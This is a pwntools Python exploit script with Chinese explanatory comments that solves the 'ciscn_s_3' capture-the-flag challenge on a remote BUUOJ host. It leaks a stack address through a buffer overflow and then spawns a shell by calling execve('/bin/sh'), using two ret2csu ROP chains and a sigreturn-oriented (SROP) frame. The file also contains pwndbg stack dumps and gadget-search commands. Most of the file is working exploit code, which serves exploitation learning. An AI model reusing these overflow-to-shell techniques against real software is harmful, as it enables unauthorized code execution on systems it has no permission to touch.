from pwn import *

# r = process(r'./ciscn_s_3')
r = remote('node5.buuoj.cn', 27233)

context.log_level = 'debug'

vul_addr = 0x4004ED

#gdb.attach(r)
'''
往stack上面写入/bin/sh\x00，首先read函数可以往buf写入0x400的内容，write会将buf中0x30内容输出出来，
值得注意的是,buf只能储存0x10的内容，那么接下来write继续输出，就会将stack址输出出来，那么我们可以借write得到stack的地址

# gdb调试程序，输入 aaaaaaabbbbbbbbb：
00:0000│ rbp rsp 0x7fffffffdeb0 ◂— 0xa61616161616161 ('aaaaaaabbbbbbbbb\n')
01:0008│+008     0x7fffffffdeb8 —▸ 0x400536 (main+25) ◂— nop 
02:0010│+010     0x7fffffffdec0 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe342 ◂— '/home/kali/pwn_test/ciscn_s_3'
03:0018│+018     0x7fffffffdec8 ◂— 0x1ffffdf60
04:0020│+020     0x7fffffffded0 ◂— 0x1
05:0028│+028     0x7fffffffded8 —▸ 0x7ffff7ddfca8 (__libc_start_call_main+120) ◂— mov edi, eax

1、我们发现在主函数中，调用vuln的下一行代码的地址是0x400536，并不是以0x7f开头的，不方便计算偏移，
   因此我们使用0x7fffffffdec0指向的内存中的内容0x7fffffffdfe8计算偏移地址，他也是main函数的第一个参数argv[0]
   再所有aaaa开头的地址位置：
pwndbg> search aaaaaaabbbbbbbbb
Searching for value: 'aaaaaaabbbbbbbbb'
[stack]         0x7fffffffdea0 'aaaaaaabbbbbbbbb\n'

2、输入的aaaaaaaaaaaaaaaa位于0x7fffffffdea0中，查看该地址周围的情况：
pwndbg> tele 0x7fffffffdea0
00:0000│ rsi     0x7fffffffdea0 ◂— 'aaaaaaabbbbb\n'
01:0008│-008     0x7fffffffdea8 ◂— 0xa62626262 /* 'bbbb\n' */
02:0010│ rbp rsp 0x7fffffffdeb0 —▸ 0x7fffffffded0 ◂— 0x1
03:0018│+008     0x7fffffffdeb8 —▸ 0x400536 (main+25) ◂— nop 
04:0020│+010     0x7fffffffdec0 —▸ 0x7fffffffdfe8 —▸ 0x7fffffffe342 ◂— '/home/kali/pwn_test/ciscn_s_3'
05:0028│+018     0x7fffffffdec8 ◂— 0x1ffffdf60
06:0030│+020     0x7fffffffded0 ◂— 0x1
07:0038│+028     0x7fffffffded8 —▸ 0x7ffff7ddfca8 (__libc_start_call_main+120) ◂— mov edi, eax

3、下一条语句是：  return sys_write(1u, buf, 0x30u);，他会输出buf地址开始后的0x30字节，也就是会从0x7fffffffdea0往后的0x30都会被输出
1）那么我们选择栈地址 0x7fffffffdec0 来计算，这个地址保存的值为 0x00007fffffffdfe8，与buf地址相差dfe8-dea0 = 0x148
2）所以只要我们计算栈地址 0x7fffffffdec0 与buf的开头地址 0x7fffffffdea0 的距离为 0x20，这部分数据我们丢掉，
3）往后的输出的第一个8字节就是地址 0x7fffffffdec0 保存的值：0x7fffffffdfe8，知道这个值后，就可以按照步骤1）算出的偏移来计算出buf的开头真实地址了
'''
payload = b'A' * 0x10 + p64(vul_addr)  # 控制执行流程返回vuln函数
r.send(payload)
# aaaa开头的地址为0x7fffffffdea0，距离泄漏地址0x7fffffffdec0的长度为0x20，这中间的数据是不需要的，0x20后才是我们泄漏的地址
r.recv(0x20)
rbp_addr = u64(r.recv(8))
buf_addr = rbp_addr - 0x148  # 远程环境是0x118
print(f"buf_addr: {str(hex(buf_addr))}")

'''
找到了字符串后，我们可以尝试利用溢出，控制程序的走向，即构造execv('/bin/sh',0,0)，再通过syscall执行execv，从而获取shell，栈大致布局如下：
rax=59
rdi='/bin/sh'
rsi=0
rdx=0
syscall
通过下面的两个命令，我们可以得到控制上述的指令：
$ ROPgadget --binary ciscn_s_3  --only 'pop|ret'
$ ROPgadget --binary ciscn_s_3  --only 'mov|ret'
但无法找到直接修改rdx的地方，我们可以通过使用下面的命令查找修改该寄存器的地方：
$ objdump ciscn_s_3 --disassemble  -M intel | grep rdx
  4003e2:       49 89 d1                mov    r9,rdx
  4003e6:       48 89 e2                mov    rdx,rsp
  40055e:       49 89 d5                mov    r13,rdx
  400580:       4c 89 ea                mov    rdx,r13

继续使用命令观察0x400580后面的指令：
.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580

连续6个pop的指令：
.text:0000000000400596 loc_400596:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400596                 add     rsp, 8
.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn

jnz: jump not zero, 未设置zf标志或两者不相等的时候跳转到指定函数
zf: zero flag, 执行相关指令后结果为0时，设置ZF=1
cmp: compare 目标,源  用目标-源
                    目标>源: ZF=0,CF=0
                    目标<源: ZF=0,CF=1
                    目标=源: ZF=1,CF=0

所以必须要rbx与rbp相等才能跳出loc_400580函数循环           
'''

execve_addr = 0x4004E2  # rax=59 =>    mov     rax, 3Bh ;
sigreturn_addr = 0x4004DA  # rax=15 => mov     rax, 0Fh
pop_rdi = 0x4005a3  # rdi=0（第一个参数）
# pop_rsi_r15 = 0x4005a1  # rsi=0（第二个参数）
pop_rbx_rbp_r12_r13_r14_r15 = 0x40059A  # 目的是操作：rbx rbp r12
pop_rbp = 0x400440
csu_init_rdx_addr = 0x400580  # 里面包含了操作rdx rsi的指令
syscall = 0x400501
ret_addr = 0x4003a9

'''
* 为什么要用 p64(buf_addr + 0x50) ？因为语句：call  [r12+rbx*8] 中是调用了[r12+rbx*8]所在的内存地址的值，不是r12+rbx*8的值本身
* 通过计算 buf_addr 到 execve_addr地址的偏移为 0x50 个长度：
pwndbg> tele 0x7ffd4f3daf70 50
00:0000│ rsi     0x7ffd4f3daf70 ◂— 0x68732f6e69622f /* '/bin/sh' */                                buf_addr                
01:0008│-008     0x7ffd4f3daf78 ◂— 0x4242424242424242 ('BBBBBBBB')                                         
02:0010│ rbp rsp 0x7ffd4f3daf80 —▸ 0x40059a (__libc_csu_init+90) ◂— pop rbx                                
03:0018│+008     0x7ffd4f3daf88 ◂— 0x0                                                                     
04:0020│+010     0x7ffd4f3daf90 ◂— 0x0                                                                     
05:0028│+018     0x7ffd4f3daf98 —▸ 0x7ffd4f3dafc0 —▸ 0x4004e2 (gadgets+12) ◂— mov rax, 0x3b        buf_addr + 0x50        
06:0030│+020     0x7ffd4f3dafa0 ◂— 0x0                                                                     
... ↓            2 skipped                                                                                 
09:0048│+038     0x7ffd4f3dafb8 —▸ 0x400580 (__libc_csu_init+64) ◂— mov rdx, r13
0a:0050│+040     0x7ffd4f3dafc0 —▸ 0x4004e2 (gadgets+12) ◂— mov rax, 0x3b
0b:0058│+048     0x7ffd4f3dafc8 —▸ 0x4005a3 (__libc_csu_init+99) ◂— pop rdi
0c:0060│+050     0x7ffd4f3dafd0 —▸ 0x7ffd4f3daf70 ◂— 0x68732f6e69622f /* '/bin/sh' */
0d:0068│+058     0x7ffd4f3dafd8 —▸ 0x400501 (vuln+20) ◂— syscall 
0e:0070│+060     0x7ffd4f3dafe0 ◂— 0x0
'''

''' =======================  解法1：csu  ========================== '''

# 构造1：巧妙利用rsp跳出循环
# http://liul14n.top/2020/03/07/Ciscn-2019-s-3/
# https://www.yalexin.top/blog/blog/115
payload = b'/bin/sh\x00' + b'B' * 8  # 写入shellcode，对应地址为buf_addr
payload += p64(pop_rbx_rbp_r12_r13_r14_r15) + p64(0) * 2 + p64(buf_addr + 0x50) + p64(0) * 3
payload += p64(csu_init_rdx_addr) + p64(execve_addr) + p64(pop_rdi) + p64(buf_addr) + p64(syscall)


# 构造2：控制rbx与rbp相等 从而跳出循环
payload2 = p64(ret_addr) + b'/bin/sh\x00'
payload2 += p64(pop_rbx_rbp_r12_r13_r14_r15)  # 调用6个pop
payload2 += p64(0) + p64(1)  # rbx=0, rbp=1；为了能够使后面的csu_init函数得跳出循环
payload2 += p64(buf_addr)  # 调用ret_addr退出函数
payload2 += p64(0) * 3  # r13,r14,r15=0
payload2 += p64(csu_init_rdx_addr)  # 接着进入csu_init, 为了操作rdx=0 rsi=0的指令
payload2 += p64(0) * 6  # 这里执行到0x400596后，会进入pop_rbx_rbp_r12_r13_r14_r15又会重新pop一遍
payload2 += p64(0)  # 由于6个pop之前有一句：add rsp, 8，会导致rsp向下移动一次，所以要多一个p64(0)
payload2 += p64(execve_addr)
payload2 += p64(pop_rdi) + p64(buf_addr + 8)
payload2 += p64(syscall)

# r.send(payload)
# r.interactive()


''' =======================  解法2：sigret  ========================== '''
'''
需要满足下面的条件，可以通过栈溢出来控制栈的内容，需要知道相应的地址
    "/bin/sh"
    Signal Frame
    syscall
    sigreturn
需要有够大的空间来塞下整个 sigal frame
在目前的 pwntools 中已经集成了对于 srop 的攻击
'''

context(os='linux', arch='amd64', log_level='debug')

signframe = SigreturnFrame()
signframe.rax = constants.SYS_execve
signframe.rdi = buf_addr
signframe.rsi = 0
signframe.rdx = 0
signframe.rip = syscall

payload3 = b'/bin/sh\x00' + b'B' * 8
payload3 += p64(sigreturn_addr) + p64(syscall) + bytes(signframe)

r.send(payload3)
r.interactive()
